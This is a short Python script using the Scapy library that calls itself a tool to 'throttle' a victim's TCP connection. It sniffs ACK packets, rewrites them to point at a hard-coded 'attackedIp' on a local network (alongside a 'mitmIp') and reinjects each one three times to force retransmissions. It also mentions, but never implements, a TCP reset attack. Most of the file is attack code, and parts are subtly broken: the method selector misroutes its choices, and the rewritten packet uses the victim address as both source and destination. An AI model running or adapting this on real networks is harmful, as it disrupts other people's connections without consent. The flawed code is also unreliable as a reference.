# 1. Sending 3 duplicate ACK packets to simulate packet loss and force retransmission
# 2. Sending a TCP reset packet to drop the connection altogether.

# This tool slows down TCP transmssions. 
# It does this either by sending 3 dublicate ACK packets, simulating packets loss and forcing retransmission. 
# or sending a TCP reset packet to drop the connection altogether.

# Takes as input a source and destination IP addresses for a TCP connection 
# and the approach for throttling which should be used.

import logging
logger = logging.getLogger("scapy")
logger.setLevel(logging.CRITICAL)
# logger.setLevel(logging.INFO)

from scapy.all import *

def throttleTCP(sourceIP, destIp, throttle):
    if throttle == "dublicateACK":
        print("dublicateACK")
    if throttle == "RST":
        print("RST")
    else:
        print("Select either 'dublicateACK' or 'RST' as throttle method.")
        
# throttleTCP("localhost", "localhost", "RST")

usedAcks = set()
attackedIp = "192.168.0.177"
mitmIp = "192.168.0.192"

def retransmit_ack(packet):
    if packet.haslayer(TCP) and packet[TCP].flags == "A":  # Checking for ACK flag
        print(f"Captured new ACK Packet: {packet.summary()} with number {packet[TCP].ack}")
        incomingAck = packet[TCP].ack
        if incomingAck not in usedAcks:
            print(f"Captured new ACK Packet: {packet.summary()}")
            print(f"Ack is: {incomingAck}")
            usedAcks.add(incomingAck)
            new_packet = packet.copy()
            new_packet[IP].dst = attackedIp
            new_packet[IP].src = attackedIp
            del new_packet[IP].chksum
            del new_packet[TCP].chksum
            sendp(new_packet, iface="enp3s0", count=3, inter=0.0)  
            print("Retransmitted ACK Packet.")

def main():
    sniff(prn=retransmit_ack, count=1000000) 

if __name__=="__main__":
    main()